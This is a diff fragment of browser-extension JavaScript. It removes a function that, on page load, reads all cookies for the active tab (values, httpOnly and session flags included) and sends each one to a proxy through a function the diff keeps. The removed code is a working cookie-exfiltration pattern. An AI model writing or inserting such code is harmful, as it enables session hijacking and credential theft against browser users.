@@ -39,30 +39,6 @@ function sendCookieToProxy(cookie) {
     console.error('Failed:', err);
   });
 }
-
-function sendAllCookies() {
-  chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
-    if (!tabs.length || !tabs[0].url.startsWith('http')) return;
-
-    chrome.cookies.getAll({ url: tabs[0].url }, cookies => {
-      cookies.forEach(cookie => {
-        sendCookieToProxy({
-          name: cookie.name,
-          value: cookie.value,
-          domain: cookie.domain,
-          path: cookie.path,
-          secure: cookie.secure,
-          httpOnly: cookie.httpOnly,
-          sameSite: cookie.sameSite,
-          session: cookie.session,
-          expirationDate: cookie.expirationDate
-        });
-      });
-    });
-  });
-}
-
-document.addEventListener('DOMContentLoaded', sendAllCookies);
 ```
 
 
